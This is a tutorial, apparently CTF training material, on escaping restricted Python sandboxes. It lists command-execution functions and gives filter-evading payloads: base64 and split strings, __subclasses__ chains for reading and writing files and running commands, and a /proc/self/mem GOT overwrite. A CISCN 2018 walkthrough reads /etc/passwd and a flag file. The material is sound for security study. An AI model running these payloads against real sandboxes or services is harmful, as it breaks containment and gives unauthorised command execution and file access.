# Python Sandbox
The so-called Python sandbox simulates a Python terminal through certain methods, enabling users to use Python.

## Some Methods for Python Sandbox Escape
What we commonly refer to as Python sandbox escape is bypassing the simulated Python terminal to ultimately achieve command execution.
### Importing Modules
Among Python's built-in functions, there are some functions that can help us achieve arbitrary command execution:
```
os.system() os.popen()
commands.getstatusoutput() commands.getoutput()
commands.getstatus()
subprocess.call(command, shell=True) subprocess.Popen(command, shell=True)
pty.spawn()
```
There are generally three ways to import modules in Python (where xxx is the module name):

1. `import xxx`
2. `from xxx import *`
3. `__import__('xxx')`

We can use the above import methods to import the relevant modules and use the aforementioned functions to achieve command execution.
In addition, we can also **import modules via their file path**:
For example, on a Linux system, the path to the Python os module is usually `/usr/lib/python2.7/os.py`. When we know the path, we can import the module through the following operations and further use the related functions.
```py
>>> import sys
>>> sys.modules['os']='/usr/lib/python2.7/os.py'
>>> import os
>>>
```
**Examples of Other Dangerous Functions**
Such as **execfile** for file execution
```py
>>> execfile('/usr/lib/python2.7/os.py')
>>> system('cat /etc/passwd')
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
>>> getcwd()
'/usr/lib/python2.7'
```
**timeit**
```py
import timeit
timeit.timeit("__import__('os').system('dir')",number=1)
```

**exec and eval are quite classic**
```py
eval('__import__("os").system("dir")')

```
**platform**

```py
import platform
print platform.popen('dir').read()
```

However, a normal Python sandbox will use a blacklist to prohibit the use of certain modules like os, or use a whitelist to only allow users to use the modules provided by the sandbox, in order to prevent dangerous operations. How to further escape the sandbox is the focus of our research.

### Python Built-in Functions
When we cannot import modules, or the modules we want to import are banned, we can only resort to Python's own built-in functions (i.e., functions that are usually imported automatically by Python without manual import). We can get the list of built-in functions through `dir __builtin__`
```python
>>> dir(__builtins__)
['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BufferError', 'BytesWarning', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'NameError', 'None', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'ReferenceError', 'RuntimeError', 'RuntimeWarning', 'StandardError', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', '_', '__debug__', '__doc__', '__import__', '__name__', '__package__', 'abs', 'all', 'any', 'apply', 'basestring', 'bin', 'bool', 'buffer', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'cmp', 'coerce', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'execfile', 'exit', 'file', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'intern', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'long', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'raw_input', 'reduce', 'reload', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'unichr', 'unicode', 'vars', 'xrange', 'zip']
```
In Python, built-in functions that can be used directly without importing are called **builtin** functions, automatically imported into the environment with the **__builtin__** module. So how do we import modules? We can use **__dict__** to import the modules we want. The purpose of **__dict__** is to list all attributes and functions under a module/class/object. This is very useful in sandbox escape, as it can find things hidden within.
What can **__dict__** do?
We know that a module object has a namespace implemented by a dictionary object. Attribute references are converted to lookups in this dictionary, for example, m.x is equivalent to m.dict["x"].

Bypass example:
First, bypass plaintext character detection through base64
```python
>>> import base64
>>> base64.b64encode('__import__')
'X19pbXBvcnRfXw=='
>>> base64.b64encode('os')
'b3M='
```
Then reference through **__dict__**
```py
>>> __builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))
```

*If some built-in functions have been deleted from __builtins__, we can reload them via reload(__builtins__) to get a complete __builtins__*
### Creating Objects and References
Python's object class integrates many basic functions. When we want to call them, we can do so by creating objects and then referencing them.

We have two common methods:
```bash
().__class__.__bases__[0]
''.__class__.__mro__[2]
```
![](http://oayoilchh.bkt.clouddn.com/18-5-3/14928461.jpg)
For example, we can use
`print ().__class__.__bases__[0].__subclasses__()[40]("/etc/services").read()` to achieve file reading,

**Common payloads**
```py
# Read file
().__class__.__bases__[0].__subclasses__()[40](r'C:\1.php').read()

# Write file
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')

# Execute arbitrary commands
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )
```

### Indirect References
In some challenges, such as the 2018 CISCN (China Information Security Competition) Python sandbox challenge, import was essentially completely stripped. However, in Python, the native **__import__** still has references. As long as we find the relevant object references, we can further obtain the content we want. The demo below will explain this in detail.

### Overwriting the GOT Table via write
This is essentially a memory manipulation method using **/proc/self/mem**.
**/proc/self/mem** is a memory image that allows reading and writing to all memory of a process, including executable code. If we can obtain the offset of some Python functions, such as **system**, we can achieve a shell by overwriting the GOT table.
```py
(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40]('c'+'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb'))(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem','r'),().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0))
```
The first address is the offset of system, and the second is the offset of fopen. We can obtain the relevant information through **objdump**.
![](http://oayoilchh.bkt.clouddn.com/18-5-3/25123674.jpg)

## Example
Python sandbox escape from the 2018 CISCN (China Information Security Competition for College Students).
We can use `print ().__class__.__bases__[0].__subclasses__()[40]("/home/ctf/sandbox.py").read()` to obtain the challenge source code, and then analyze it further. Below are three escape methods.
### Creating Objects and Exploiting Python's String Manipulation Features
```py
x = [x for x in [].__class__.__base__.__subclasses__() if x.__name__ == 'ca'+'tch_warnings'][0].__init__
x.__getattribute__("func_global"+"s")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s')
x.__getattribute__("func_global"+"s")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s /home/ctf')
x.__getattribute__("func_global"+"s")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ca'+'t /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb')
```
### Hijacking the GOT Table to Get a Shell
```py
(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40]('l'+'s /home/ctf/'))(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem','r'),().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0))


(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40]('c'+'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb'))(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem','r'),().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0))

```
### Finding Indirect References to __import__
During continuous use of dir, it was discovered that the __closure__ object stores parameters and can be used to reference the native __import__
```py

print __import__.__getattribute__('__clo'+'sure__')[0].cell_contents('o'+'s').__getattribute__('sy'+'stem')('l'+'s home') 
```
## References
https://xz.aliyun.com/t/52#toc-10 
https://blog.csdn.net/qq_35078631/article/details/78504415 
https://www.anquanke.com/post/id/85571 
http://bestwing.me/2018/05/03/awesome-python-sandbox-in-ciscn/#0x01
